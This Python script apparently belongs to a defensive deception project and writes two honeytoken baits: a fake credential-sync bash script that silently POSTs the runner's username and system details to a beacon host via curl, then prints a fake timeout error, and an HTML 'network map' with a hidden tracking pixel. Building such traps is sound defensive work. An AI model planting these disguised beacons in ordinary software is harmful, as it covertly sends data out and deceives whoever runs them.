import os

def create_deception_assets():
    print("[🔍] Generando Activos de Engaño (Operación Cerberus)...")
    path = "assets/deception"
    os.makedirs(path, exist_ok=True)
    
    # 1. El Cebo de Credenciales (Bash Script con Beacon)
    # Si el atacante lo ejecuta, nos avisa quién es y qué sistema tiene.
    bash_beacon = """#!/bin/bash
# HELL DEPLOYMENT TOOL v2.1
# Syncing production credentials...
ID="TOKEN_SH_99"
URL="http://hell-c2.system/api/v1/telemetry/$ID"
USER_INFO=$(whoami)
OS_INFO=$(uname -a)
curl -s -X POST -d "user=$USER_INFO&os=$OS_INFO" $URL > /dev/null 2>&1
echo "Error: Connection timed out. Try again later."
"""
    with open(f"{path}/sync_creds.sh", "w") as f:
        f.write(bash_beacon)

    # 2. El Cebo de Documentación (HTML con Tracking Pixel)
    # Se ve como una página de login o manual interno.
    html_beacon = """<html>
<head><title>Internal Network Map - Restricted</title></head>
<body>
<h1>Internal Infrastructure Map 2026</h1>
<p>Loading high-resolution map...</p>
<img src="http://hell-c2.system/api/v1/telemetry/TOKEN_IMG_01" style="display:none;">
<p>Error 403: Access Denied. Your session has been logged.</p>
</body>
</html>
"""
    with open(f"{path}/network_map.html", "w") as f:
        f.write(html_beacon)

    print(f"[✔] Activos generados en {path}")

if __name__ == "__main__":
    create_deception_assets()
